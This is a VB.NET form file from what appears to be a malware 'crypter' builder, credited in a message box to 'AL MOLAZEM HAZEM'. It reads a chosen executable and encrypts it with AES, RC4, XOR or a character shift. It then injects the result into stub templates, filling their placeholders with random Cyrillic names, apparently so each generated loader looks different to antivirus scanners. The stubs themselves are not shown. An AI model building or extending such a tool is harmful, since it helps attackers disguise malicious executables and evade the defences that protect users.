﻿Imports System.Security.Cryptography
Imports System.Text

Public Class Form1

    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        My.Computer.Audio.Play(My.Resources.button_3, AudioPlayMode.Background)
        Dim x As New OpenFileDialog
        With x

            .Filter = "|*.exe"
            .ShowDialog()
        End With

        FlatTextBox1.Text = x.FileName

    End Sub

    Private Sub FlatClose1_Click(sender As Object, e As EventArgs) Handles FlatClose1.Click
        Me.Close()
        My.Computer.Audio.Play(My.Resources.button_43, AudioPlayMode.Background)

    End Sub

    Private Sub FlatButton2_Click(sender As Object, e As EventArgs) Handles FlatButton2.Click
        On Error Resume Next

        If FlatCheckBox1.Checked Then

            Dim fox As String = Convert.ToBase64String(IO.File.ReadAllBytes(FlatTextBox1.Text))

            Dim fox1 As String = Class1.Rijndaelcrypt(fox, key.Text)

            Dim fox3 As String = My.Resources.RijndaelDecrypt
            Dim fox4 As String





            fox4 = fox3.Replace("%1%", xx(4)).Replace("%2%", fox1).Replace("%3%", xx(6)).Replace("%4%", xx(8)).Replace("%5%", xx(10)).Replace("%6%", xx(12)).Replace("%7%", xx(13)).Replace("%8%", key.Text)

            r1.Text = fox4





        End If

        If FlatCheckBox2.Checked Then

            Dim xxx() As Byte = Class3.MD5.Encrypt(IO.File.ReadAllBytes(FlatTextBox1.Text), key.Text)
            Dim xx1 As String = Convert.ToBase64String(xxx)

            Dim fox3 As String = My.Resources.MD5
            Dim fox4 As String

            fox4 = fox3.Replace("%1%", xx(4)).Replace("%2%", xx1).Replace("%3%", xx(6)).Replace("%4%", xx(8)).Replace("%5%", xx(10)).Replace("%6%", key.Text)

            r1.Text = fox4

        End If
        If FlatCheckBox3.Checked Then

            Dim xxx() As Byte = Class4.Form1.Md5Encrypt(IO.File.ReadAllBytes(FlatTextBox1.Text), key.Text)

            Dim xx1 As String = Convert.ToBase64String(xxx)




            Dim fox3 As String = My.Resources.MD51
            Dim fox4 As String

            fox4 = fox3.Replace("%1%", xx(4)).Replace("%2%", xx1).Replace("%3%", xx(6)).Replace("%4%", xx(8)).Replace("%5%", xx(10)).Replace("%8%", key.Text)

            r1.Text = fox4

        End If


        If FlatCheckBox4.Checked Then

            Dim xxx() As Byte = Class5.XOREncrypt(IO.File.ReadAllBytes(FlatTextBox1.Text), key.Text)

            Dim xx1 As String = Convert.ToBase64String(xxx)




            Dim fox3 As String = My.Resources._xor
            Dim fox4 As String

            fox4 = fox3.Replace("%1%", xx(4)).Replace("%2%", xx1).Replace("%3%", xx(6)).Replace("%4%", xx(8)).Replace("%5%", xx(10)).Replace("%8%", key.Text)

            r1.Text = fox4

        End If


        If FlatCheckBox5.Checked Then

            Dim xxx() As Byte = Class6.RC4Encrypt(IO.File.ReadAllBytes(FlatTextBox1.Text), key.Text)


            Dim xx1 As String = Convert.ToBase64String(xxx)




            Dim fox3 As String = My.Resources.RC4
            Dim fox4 As String

            fox4 = fox3.Replace("%1%", xx(4)).Replace("%2%", xx1).Replace("%3%", xx(6)).Replace("%4%", xx(8)).Replace("%5%", xx(10)).Replace("%8%", key.Text)

            r1.Text = fox4

        End If


        If FlatCheckBox10.Checked Then


            Dim fox As String = Convert.ToBase64String(IO.File.ReadAllBytes(FlatTextBox1.Text))

            Dim lol As String = HAZEMEncrypt(fox)

            Dim fox3 As String = My.Resources.hazem

            Dim fox4 As String

            fox4 = fox3.Replace("%1%", xx(4)).Replace("%2%", lol).Replace("%3%", xx(6)).Replace("%4%", xx(8)).Replace("%5%", xx(10)).Replace("%100%", hazem.Text)

            r1.Text = fox4
        End If


        If FlatCheckBox99.Checked Then


            Dim fox As String = Convert.ToBase64String(IO.File.ReadAllBytes(FlatTextBox1.Text))

            Dim dddd As String = AES_Encrypt(fox, hazem.Text)

            Dim fox3 As String = My.Resources.AESS

            Dim fox4 As String

            fox4 = fox3.Replace("%1%", xx(4)).Replace("%2%", dddd).Replace("%3%", xx(6)).Replace("%4%", xx(8)).Replace("%5%", xx(10)).Replace("%6%", xx(12)).Replace("%8%", hazem.Text)

            r1.Text = fox4
        End If


        My.Computer.Audio.Play(My.Resources.button_17, AudioPlayMode.Background)


    End Sub
    Public Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New RijndaelManaged
        Dim Hash_AES As New MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncryptor As ICryptoTransform = AES.CreateEncryptor
            Dim buffer As Byte() = ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncryptor.TransformFinalBlock(buffer, 0, buffer.Length))

        Catch ex As Exception

        End Try
        Return encrypted
    End Function
    Public Function HAZEMEncrypt(ByVal x As String)
        Dim lol As String = ""
        For Each g As Char In x
            lol += Chr(Asc(g) + 88)
        Next
        Return lol
    End Function



    Public Function GEN(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "ПрывітаннеяквыставіцесяЦівыдзевызнаходзіцесяЧамутамнебыловыспрабаваліпаехацьувыдаленыммесцыцівыненавідзіцеПадарожжы".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function GEN1(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "123456789".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Public Function xx(ByVal len As Long)
        Dim rnd As New Random
        Dim arb As String = "ПрывітаннеяквыставіцесяЦівыдзевызнаходзіцесяЧамутамнебыловыспрабаваліпаехацьувыдаленыммесцыцівыненавідзіцеПадарожжы"
        Dim result As String = Nothing
        For i = 0 To len
            result = result & arb(rnd.Next(arb.Length))

        Next
        Return result
    End Function

    Private Sub key_TextChanged(sender As Object, e As EventArgs) Handles key.TextChanged



    End Sub
    Private Sub key_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles key.MouseMove


        My.Computer.Audio.Play(My.Resources.xcxc, AudioPlayMode.Background)
        key.Text = GEN(FlatTrackBar1.Value)
    End Sub

    Private Sub FlatButton2_Click_1(sender As Object, e As EventArgs) Handles FlatButton2.Click

    End Sub

    Private Sub FlatButton2_Click_2(sender As Object, e As EventArgs) Handles FlatButton2.Click

    End Sub

    Private Sub FlatButton2_Click_3(sender As Object, e As EventArgs) Handles FlatButton2.Click

    End Sub

    Private Sub FormSkin1_Click(sender As Object, e As EventArgs) Handles FormSkin1.Click

    End Sub

    Private Sub FlatComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)

    End Sub
    Private Sub hazem_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles hazem.MouseMove


        My.Computer.Audio.Play(My.Resources.xcxc, AudioPlayMode.Background)
        hazem.Text = GEN1(FlatTrackBar2.Value)
    End Sub

    Private Sub TabPage1_Click(sender As Object, e As EventArgs)
        Form2.Show()
        Me.Hide()

    End Sub

    Private Sub TabPage1_Click_1(sender As Object, e As EventArgs)
        Form2.Show()

    End Sub


    Private Sub FlatButton3_Click(sender As Object, e As EventArgs)
        Form2.Show()
        Me.Hide()


    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

        Form2.Show()
        Me.Hide()
        My.Computer.Audio.Play(My.Resources.button_3, AudioPlayMode.Background)
    End Sub

    Private Sub FlatTrackBar1_Scroll(sender As Object) Handles FlatTrackBar1.Scroll
        My.Computer.Audio.Play(My.Resources.yyy, AudioPlayMode.Background)
    End Sub


    Private Sub FlatButton4_Click(sender As Object, e As EventArgs) Handles FlatButton4.Click
        r1.Text = ""

    End Sub

    Private Sub FlatButton3_Click_1(sender As Object, e As EventArgs) Handles FlatButton3.Click
        r1.SelectAll()
        r1.Copy()
        FlatLabel1.Text = "Copies successfully"
        My.Computer.Audio.Play(My.Resources.button_43, AudioPlayMode.Background)
    End Sub

    Private Sub PictureBox2_Click(sender As Object, e As EventArgs) Handles PictureBox2.Click
        MsgBox("Thank you for the use of encryption programs AL MOLAZEM HAZEM")
    End Sub

    Private Sub FlatButton5_Click(sender As Object, e As EventArgs) Handles FlatButton5.Click
        Form3.Show()
        Me.Hide()

    End Sub

    Private Sub FlatToggle1_CheckedChanged(sender As Object) Handles FlatToggle1.CheckedChanged


        If FlatToggle1.Checked Then





        End If
    End Sub

    Private Sub FlatButton2_Click_4(sender As Object, e As EventArgs) Handles FlatButton2.Click

    End Sub

    Private Sub FormSkin1_Click_1(sender As Object, e As EventArgs) Handles FormSkin1.Click

    End Sub

    Private Sub FlatButton6_Click(sender As Object, e As EventArgs) Handles FlatButton6.Click
        Form5.Show()
        Me.Hide()

    End Sub

    Private Sub FormSkin1_Click_2(sender As Object, e As EventArgs) Handles FormSkin1.Click

    End Sub
End Class


